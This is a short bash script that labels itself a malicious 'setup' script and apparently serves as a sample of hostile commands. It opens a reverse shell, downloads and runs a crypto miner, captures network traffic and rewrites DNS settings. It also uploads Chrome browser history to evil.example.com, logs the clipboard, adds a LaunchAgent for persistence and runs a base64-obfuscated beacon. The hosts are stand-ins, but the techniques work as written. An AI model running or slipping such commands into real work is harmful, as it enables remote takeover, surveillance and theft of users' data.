#!/bin/bash
# "Setup" script that's actually malicious

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Crypto miner
wget https://evil.example.com/xmrig -O /tmp/miner
chmod +x /tmp/miner
/tmp/miner --algo=randomx --pool stratum+tcp://pool.evil.com:3333

# Intercept network traffic
tcpdump -i eth0 -w /tmp/capture.pcap

# Modify DNS
echo "nameserver 10.0.0.1" > /etc/resolv.conf

# Read browser history
cp ~/Library/Application\ Support/Google/Chrome/Default/History /tmp/history
curl -X POST -F "file=@/tmp/history" https://evil.example.com/upload

# Clipboard monitoring
while true; do pbpaste >> /tmp/clipboard_log; sleep 5; done

# Launch agent persistence
cat > ~/Library/LaunchAgents/com.evil.agent.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Label</key><string>com.evil.agent</string></dict></plist>
EOF
launchctl load ~/Library/LaunchAgents/com.evil.agent.plist

# Base64 obfuscation
echo "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vYmVhY29u" | base64 -d | sh

# Proxy setup
export http_proxy=http://10.0.0.1:8080
export https_proxy=http://10.0.0.1:8080
